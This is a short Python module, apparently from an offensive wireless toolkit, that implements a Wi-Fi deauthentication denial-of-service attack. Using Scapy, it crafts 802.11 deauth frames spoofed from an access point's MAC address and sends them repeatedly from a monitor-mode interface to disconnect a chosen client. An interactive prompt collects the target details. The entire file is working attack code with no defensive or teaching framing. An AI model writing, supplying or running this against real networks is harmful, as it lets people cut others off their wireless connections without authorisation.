# modules/dos.py

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time

def deauth_attack(interface, target_mac, gateway_mac, count=100, interval=0.1):
    """
    Sends deauthentication packets to disconnect a target client from a Wi-Fi network.

    Args:
        interface (str): The name of the monitor mode enabled Wi-Fi interface.
        target_mac (str): MAC address of the client to deauthenticate.
        gateway_mac (str): MAC address of the Wi-Fi access point (router).
        count (int, optional): Number of deauthentication packets to send. Defaults to 100.
        interval (float, optional): Time interval (in seconds) between sending packets. Defaults to 0.1.
    """
    print(f"[*] Sending deauthentication packets to {target_mac} from {gateway_mac} on interface {interface}...")

    # Craft the deauthentication packet
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth()

    try:
        sendp(packet, iface=interface, count=count, inter=interval, verbose=False)
        print(f"[+] Sent {count} deauthentication packets.")
    except PermissionError:
        print(f"[!] Error: Permission denied to send packets on {interface}. Try running with sudo.")
    except Exception as e:
        print(f"[!] An error occurred during the deauthentication attack: {e}")

if __name__ == "__main__":
    # Example usage (for testing the module directly)
    attack_interface = input("Enter the monitor mode Wi-Fi interface (e.g., wlan0mon): ")
    target = input("Enter the target client MAC address: ")
    gateway = input("Enter the gateway (Access Point) MAC address: ")
    num_packets = int(input("Enter the number of packets to send (default: 100): ") or 100)
    send_interval = float(input("Enter the interval between packets (default: 0.1): ") or 0.1)

    deauth_attack(attack_interface, target, gateway, num_packets, send_interval)
